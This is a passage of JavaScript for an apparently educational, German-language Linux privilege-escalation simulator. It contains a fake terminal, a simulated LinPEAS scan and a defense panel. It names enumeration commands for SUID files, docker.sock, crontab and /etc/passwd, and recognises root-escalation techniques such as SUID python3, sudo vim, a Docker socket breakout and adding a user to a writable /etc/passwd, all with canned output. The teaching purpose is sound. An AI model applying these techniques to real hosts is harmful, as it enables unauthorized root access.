          if (id === 'docker_sock') item.result = sc.misconfigs.indexOf('docker_sock') !== -1 ? '⚠ world-writable!' : 'nicht vorhanden';
          if (id === 'writable_files') item.result = sc.misconfigs.indexOf('writable_passwd') !== -1 ? '⚠ /etc/passwd writable!' : 'OK';
        }
      });
    }
    renderChecklist();
  }

  function updateStepControls() {
    var steps = getCurrentScenarioSteps();
    var btnPrev = document.getElementById('btn-prev-step');
    var btnNext = document.getElementById('btn-next-step');
    var counter = document.getElementById('step-counter');
    if (btnPrev) btnPrev.disabled = state.currentStep === 0;
    if (btnNext) btnNext.disabled = state.currentStep >= steps.length - 1;
    if (counter) counter.textContent = steps.length > 0 ? (state.currentStep + 1) + ' / ' + steps.length : '—';
  }

  function bindStepControls() {
    var btnPrev = document.getElementById('btn-prev-step');
    var btnNext = document.getElementById('btn-next-step');
    var btnAuto = document.getElementById('btn-auto-play');
    var btnReset = document.getElementById('btn-step-reset');
    if (btnPrev) btnPrev.addEventListener('click', function() {
      if (state.currentStep > 0) { state.currentStep--; renderSteps(); renderPathGraph(); renderServerModel(); updateStepControls(); }
    });
    if (btnNext) btnNext.addEventListener('click', advanceStep);
    if (btnAuto) btnAuto.addEventListener('click', toggleAutoPlay);
    if (btnReset) btnReset.addEventListener('click', function() { stopAutoPlay(); state.currentStep = 0; state.checkedItems = []; renderAll(); });
  }

  function advanceStep() {
    var steps = getCurrentScenarioSteps();
    if (state.currentStep < steps.length - 1) {
      state.currentStep++;
      renderSteps();
      renderPathGraph();
      renderServerModel();
      updateStepControls();
    }
  }

  function toggleAutoPlay() {
    if (state.autoPlaying) { stopAutoPlay(); return; }
    state.autoPlaying = true;
    var btn = document.getElementById('btn-auto-play');
    if (btn) btn.textContent = '⏸ Stop';
    function tick() {
      var steps = getCurrentScenarioSteps();
      if (state.currentStep >= steps.length - 1) { stopAutoPlay(); return; }
      advanceStep();
      state.autoTimer = setTimeout(tick, 2500);
    }
    tick();
  }

  function stopAutoPlay() {
    state.autoPlaying = false;
    clearTimeout(state.autoTimer);
    var btn = document.getElementById('btn-auto-play');
    if (btn) btn.textContent = '▶▶ Auto-Play';
  }

  // ============================================================
  // CHECKLIST
  // ============================================================
  function renderChecklist() {
    var el = document.getElementById('checklist');
    if (!el) return;
    var sc = SCENARIOS[state.scenario];
    var criticalCount = 0;

    var html = CHECKLIST.map(function(item) {
      var checked = state.checkedItems.indexOf(item.id) !== -1;
      var isCritical = checked && item.result && item.result.charAt(0) === '⚠';
      if (isCritical) criticalCount++;
      return '<div class="pv-check-item' + (checked ? ' pv-check-done' : '') + '">' +
        '<span class="pv-check-icon">' + (checked ? (isCritical ? '⚠' : '✓') : '☐') + '</span>' +
        '<span class="pv-check-label">' + esc(item.label) + '</span>' +
        (checked && item.result ? '<span class="pv-check-result' + (isCritical ? ' pv-critical' : '') + '">' + esc(item.result) + '</span>' : '') +
        '</div>';
    }).join('');

    var critLabel = state.checkedItems.length === 0
      ? '<span style="color:var(--muted)">Noch keine Checks</span>'
      : 'Findings: <span style="color:' + (criticalCount > 0 ? '#ef4444' : '#4fffb0') + '">' + criticalCount + ' kritisch</span>';

    el.innerHTML = html + '<div class="pv-check-summary">' + critLabel + '</div>';
  }

  // ============================================================
  // TERMINAL
  // ============================================================
  function bindTerminal() {
    var input = document.getElementById('term-input');
    var output = document.getElementById('term-output');
    if (!input || !output) return;

    input.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        var cmd = input.value.trim();
        input.value = '';
        if (cmd) handleTerminalCommand(cmd);
      }
    });

    // Suggestion buttons
    document.querySelectorAll('[data-term-cmd]').forEach(function(btn) {
      btn.addEventListener('click', function() { handleTerminalCommand(this.dataset.termCmd); });
    });
  }

  function handleTerminalCommand(cmd) {
    var sc = SCENARIOS[state.scenario];
    var output = document.getElementById('term-output');
    if (!output) return;

    // Echo command
    appendTermLine(output, '$ ' + cmd, '#4fffb0');

    // Find response
    var resp = TERMINAL_COMMANDS[cmd];
    var out;
    if (resp) {
      // Scenario-specific overrides
      out = getTerminalOutput(cmd, sc);
      if (resp.checklist) resp.checklist.forEach(function(id) { checkItem(id, null); });
    } else if (cmd === 'clear') {
      output.innerHTML = '';
      return;
    } else if (cmd.startsWith('python3') || cmd.startsWith('docker run') || cmd.startsWith('echo ') || cmd.startsWith('su ') || cmd.startsWith('sudo vim') || cmd.startsWith('/tmp/rootbash')) {
      out = tryExploit(cmd, sc);
    } else {
      out = 'bash: ' + cmd.split(' ')[0] + ': command not found\n(Tippe \'help\' für verfügbare Befehle)';
    }

    if (out) {
      out.split('\n').forEach(function(line) {
        var isRoot = line.indexOf('root') !== -1 && line.indexOf('uid=0') !== -1;
        appendTermLine(output, line, isRoot ? '#ef4444' : 'var(--muted)');
      });
    }

    renderChecklist();
    output.scrollTop = output.scrollHeight;
  }

  function getTerminalOutput(cmd, sc) {
    var m = sc.misconfigs || [];
    if (cmd === 'sudo -l') {
      return m.indexOf('sudo_vim') !== -1
        ? 'User www-data may run:\n    (ALL) NOPASSWD: /usr/bin/vim'
        : 'User www-data is not allowed to run sudo on proxmox.';
    }
    if (cmd === 'cat /etc/crontab') {
      return m.indexOf('writable_cron') !== -1
        ? 'SHELL=/bin/sh\n* * * * * root /opt/scripts/backup.sh'
        : 'SHELL=/bin/sh\n0 2 * * * root /usr/sbin/logrotate /etc/logrotate.conf';
    }
    if (cmd === 'find / -perm -4000 2>/dev/null' || cmd === 'find / -perm -4000') {
      return m.indexOf('suid_python') !== -1
        ? '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/python3\n/usr/bin/mount\n/usr/bin/umount'
        : '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/umount';
    }
    if (cmd === 'ls -la /var/run/docker.sock') {
      return m.indexOf('docker_sock') !== -1
        ? 'srw-rw-rw- 1 root docker 0 /var/run/docker.sock'
        : 'ls: cannot access \'/var/run/docker.sock\': No such file or directory';
    }
    if (cmd === 'ls -la /etc/passwd' || cmd === 'cat /etc/passwd') {
      return m.indexOf('writable_passwd') !== -1
        ? '-rw-rw-rw- 1 root root 2847 /etc/passwd  ← WORLD-WRITABLE!'
        : '-rw-r--r-- 1 root root 2847 /etc/passwd  (OK — 644)';
    }
    var r = TERMINAL_COMMANDS[cmd];
    return r && r.out ? r.out : null;
  }

  function tryExploit(cmd, sc) {
    var m = sc.misconfigs || [];
    if (cmd.indexOf('python3') !== -1 && cmd.indexOf('setuid') !== -1 && m.indexOf('suid_python') !== -1) {
      triggerRootSuccess('SUID python3');
      return 'root@proxmox:/var/www# \n\n✅ ROOT-SHELL via SUID python3!';
    }
    if (cmd.indexOf('docker run') !== -1 && m.indexOf('docker_sock') !== -1) {
      triggerRootSuccess('Docker Socket');
      return '# root@alpine-container:/\n# chroot /mnt\n\n✅ ROOT-SHELL via Docker Socket!';
    }
    if ((cmd.indexOf('sudo vim') !== -1 || cmd.indexOf('sudo /usr/bin/vim') !== -1) && m.indexOf('sudo_vim') !== -1) {
      triggerRootSuccess('sudo vim');
      return 'root@proxmox:~# \n\n✅ ROOT-SHELL via sudo vim!';
    }
    if (cmd.indexOf('/tmp/rootbash') !== -1 && m.indexOf('writable_cron') !== -1) {
      triggerRootSuccess('Cronjob Hijack');
      return 'rootbash-5.2# \n\n✅ ROOT-SHELL via Cronjob Hijack!';
    }
    if (cmd.startsWith('echo ') && cmd.indexOf('/etc/passwd') !== -1 && m.indexOf('writable_passwd') !== -1) {
      return '(Zeile zu /etc/passwd hinzugefügt)\nNun: su hacker (Passwort: hacked)';
    }
    if (cmd.startsWith('su ') && m.indexOf('writable_passwd') !== -1) {
      triggerRootSuccess('/etc/passwd');
      return 'root@proxmox:~# \n\n✅ ROOT-SHELL via /etc/passwd!';
    }
    return 'Permission denied (oder Misconfiguration nicht aktiv im aktuellen Szenario)';
  }

  function appendTermLine(container, text, color) {
    var div = document.createElement('div');
    div.style.cssText = 'font-family:\'JetBrains Mono\',monospace;font-size:12px;color:' + color + ';white-space:pre-wrap;line-height:1.6';
    div.textContent = text;
    container.appendChild(div);
  }

  function triggerRootSuccess(method) {
    var banner = document.getElementById('root-success-banner');
    if (!banner) return;
    banner.querySelector('.pv-success-method').textContent = 'Methode: ' + method;
    banner.style.display = 'block';
    banner.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    setTimeout(function() { banner.style.display = 'none'; }, 6000);
    // Update server model
    state.currentStep = getCurrentScenarioSteps().length - 1;
    renderServerModel();
    renderPathGraph();
  }

  // ============================================================
  // LINPEAS
  // ============================================================
  function bindLinpeas() {
    var btn = document.getElementById('btn-linpeas');
    if (!btn) return;
    btn.addEventListener('click', runLinpeas);
  }

  function runLinpeas() {
    if (state.linpeasRunning) return;
    state.linpeasRunning = true;
    var output = document.getElementById('linpeas-output');
    var btn = document.getElementById('btn-linpeas');
    if (!output || !btn) return;
    output.style.display = 'block';
    output.innerHTML = '';
    btn.disabled = true;
    btn.textContent = '⏳ Scanning...';

    var sc = SCENARIOS[state.scenario];
    // Filter lines based on active misconfigs
    var lines = LINPEAS_LINES.filter(function(l) {
      if (l.text.indexOf('python3') !== -1 && sc.misconfigs.indexOf('suid_python') === -1) return false;
      if (l.text.indexOf('docker.sock') !== -1 && sc.misconfigs.indexOf('docker_sock') === -1) return false;
      if (l.text.indexOf('/etc/passwd') !== -1 && l.text.indexOf('world-writable') !== -1 && sc.misconfigs.indexOf('writable_passwd') === -1) return false;
      if (l.text.indexOf('backup.sh') !== -1 && sc.misconfigs.indexOf('writable_cron') === -1) return false;
      if (l.text.indexOf('sudo') !== -1 && l.text.indexOf('vim') !== -1 && sc.misconfigs.indexOf('sudo_vim') === -1) return false;
      return true;
    });

    var i = 0;
    function showLine() {
      if (i >= lines.length) {
        state.linpeasRunning = false;
        btn.disabled = false;
        btn.textContent = '🔍 LinPEAS erneut ausführen';
        return;
      }
      var l = lines[i];
      var div = document.createElement('div');
      div.style.cssText = 'font-family:\'JetBrains Mono\',monospace;font-size:11px;white-space:pre-wrap;line-height:1.7;color:' + (l.color || 'var(--text)');
      div.textContent = l.text;
      output.appendChild(div);
      output.scrollTop = output.scrollHeight;
      i++;
      state.linpeasTimer = setTimeout(showLine, 60 / (state.speedMultiplier || 1));
    }
    showLine();
  }

  // ============================================================
  // DEFENSE PANEL
  // ============================================================
  function bindDefense() {
    var btn = document.getElementById('btn-defense');
    if (!btn) return;
    btn.addEventListener('click', function() {
      state.defenseOpen = !state.defenseOpen;
      renderDefense();
      this.textContent = state.defenseOpen ? '🛡 Wie verhindert man das? ▴' : '🛡 Wie verhindert man das? ▾';
    });
  }

  function renderDefense() {
    var el = document.getElementById('defense-panel');
    if (!el) return;
    el.style.display = state.defenseOpen ? 'block' : 'none';
    if (!state.defenseOpen) return;

    var sc = SCENARIOS[state.scenario];
    if (!sc.defense && sc.id !== 'all') { el.innerHTML = '<div style="color:var(--muted);padding:12px">Wähle ein Einzel-Szenario.</div>'; return; }

    var fixes;
    if (sc.id === 'all') {
      // Show all fixes
      fixes = Object.keys(SCENARIOS).filter(function(k) { return k !== 'all' && SCENARIOS[k].defense; }).map(function(k) {
        return SCENARIOS[k].defense;
      });
    } else {
      fixes = [sc.defense];
    }

    el.innerHTML = fixes.map(function(d) {
      return '<div class="pv-defense-section">' +
        '<div class="pv-defense-title">' + esc(d.title) + '</div>' +
        d.fixes.map(function(f) {
          return '<div class="pv-fix">' +
            '<div class="pv-fix-label">' + esc(f.label) + '</div>' +
            '<pre class="pv-fix-code">' + esc(f.cmd) + '</pre>' +
            '</div>';
        }).join('') +
        '</div>';
    }).join('');
  }

  // ============================================================
  // NMAP SUGGESTIONS
  // ============================================================
  function updateNmapSuggestions() {
    var el = document.getElementById('homelab-commands');
    if (!el) return;
    el.innerHTML =
      '<div class="pv-hl-cmd">ssh root@192.168.0.200 <span style="color:#6b7280"># Proxmox</span></div>' +
      '<div class="pv-hl-cmd">find / -perm -4000 -type f 2>/dev/null</div>' +
      '<div class="pv-hl-cmd">ls -la /var/run/docker.sock</div>' +
      '<div class="pv-hl-cmd">cat /etc/crontab</div>' +
      '<div class="pv-hl-cmd">ls -la /etc/passwd /etc/shadow</div>' +
      '<div style="margin-top:10px;color:var(--muted)"># Jumphost</div>' +
      '<div class="pv-hl-cmd">ssh noob@192.168.0.204</div>' +
      '<div class="pv-hl-cmd">sudo -l <span style="color:#6b7280"># was darf noob?</span></div>' +
      '<div class="pv-hl-cmd">groups <span style="color:#6b7280"># sudo-Gruppe?</span></div>';
  }

  // ============================================================
  // UTILS
  // ============================================================
  function esc(s) {
    return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  window.PrivEsc = { init: init };
})();
